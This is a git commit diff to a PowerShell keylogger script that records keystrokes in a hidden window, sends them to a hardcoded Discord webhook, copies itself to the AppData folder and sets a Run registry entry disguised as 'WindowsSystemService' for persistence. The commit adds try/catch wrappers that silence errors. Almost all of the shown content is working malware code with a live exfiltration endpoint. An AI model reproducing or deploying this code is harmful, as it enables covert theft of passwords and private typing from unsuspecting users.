325250d72dd338af4ef5ecd04377706be3834f33
Roger Widmer <roger.widmer@ict-campus.ch>
2025-03-28 08:52:02 +0100

    sigma

--- sigma_gooner_logger.ps1
+++ sigma_gooner_logger.ps1
@@ -1,4 +1,4 @@
-$w = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"  # <-- Replace with your webhook
+$w = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"
 $k = "killme"
 $p = "$env:APPDATA\s.ps1"
 $l = ""
@@ -14,9 +14,9 @@ $form.Add_KeyPress({
 
     if ($t -like "*$k") {
         $global:l += "`n[Stopped by kill word]`n"
-        Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l }
-        Remove-Item $p -Force
-        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemService" -ErrorAction SilentlyContinue
+        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } } catch {}
+        try { Remove-Item $p -Force -ErrorAction SilentlyContinue } catch {}
+        try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemService" -ErrorAction SilentlyContinue } catch {}
         $form.Close()
     }
 
@@ -25,7 +25,7 @@ $form.Add_KeyPress({
 
 function Send-Log {
     if ($global:l.Length -gt 0) {
-        Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l }
+        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } } catch {}
         $global:l = ""
     }
 }
@@ -40,7 +40,9 @@ $form.ShowInTaskbar = $false
 $form.ShowIcon = $false
 
 # Save and persist
-Set-Content -Path $p -Value $MyInvocation.MyCommand.Definition -Encoding UTF8
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $p" /f | Out-Null
+try {
+    Set-Content -Path $p -Value $MyInvocation.MyCommand.Definition -Encoding UTF8
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $p" /f | Out-Null
+} catch {}
 
 [Windows.Forms.Application]::Run($form)
